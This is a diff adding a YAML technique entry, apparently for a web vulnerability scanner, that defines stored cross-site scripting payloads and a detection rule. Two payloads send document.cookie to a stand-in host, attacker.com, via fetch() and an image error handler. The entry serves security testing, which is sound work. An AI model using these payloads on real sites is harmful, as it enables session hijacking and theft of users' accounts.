@@ -1,0 +1,19 @@
+techniques:
+  - id: xss_stored_basic
+    name: "XSS - Stored"
+    vuln_type: xss_stored
+    description: "Stored XSS payloads for persistent injection"
+    severity: high
+    depth: standard
+    tags: ["xss", "stored", "persistent"]
+    payloads:
+      - value: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
+        description: "Cookie exfiltration"
+      - value: "<img src=x onerror=this.src='https://attacker.com/?c='+document.cookie>"
+        description: "Image-based cookie steal"
+      - value: "<svg onload=alert(document.domain)>"
+        description: "SVG stored XSS"
+    detection:
+      - type: string
+        value: "<script>"
+        description: "Script tag stored and rendered"
